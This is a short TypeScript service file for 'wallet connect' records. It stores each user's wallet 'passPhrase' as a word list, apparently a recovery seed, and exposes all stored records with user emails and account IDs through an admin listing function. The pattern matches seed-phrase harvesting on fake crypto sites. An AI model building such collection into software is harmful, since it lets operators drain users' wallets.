import WalletConnectModel from './walletConnect.model';

//Create a new wallet connection
export const createWalletConnection = async (input: {
  user: string;
  wallet: string;
  passPhrase: string[];
}) => {
  return await WalletConnectModel.create(input);
};

//Check if a user has a wallet connect already
export const getUserWalletConnect = async (user: string) => {
  const existing = await WalletConnectModel.findOne({ user });
  return { exists: !!existing, data: existing };
};

//Admin Services

//Get all wallet connections
export const getWalletConnections = async (page = 1, limit = 10) => {
  const skip = (page - 1) * limit;

  const [connections, total] = await Promise.all([
    WalletConnectModel.find()
      .skip(skip)
      .limit(limit)
      .sort({ createdAt: -1 })
      .populate('user', 'userName email accountId profilePicture'),
    WalletConnectModel.countDocuments(),
  ]);

  return {
    data: connections,
    pagination: {
      total,
      page,
      pages: Math.ceil(total / limit),
    },
  };
};

//Delete a wallet connect
export const deleteWalletConnection = async (id: string) => {
  return WalletConnectModel.findByIdAndDelete(id);
};
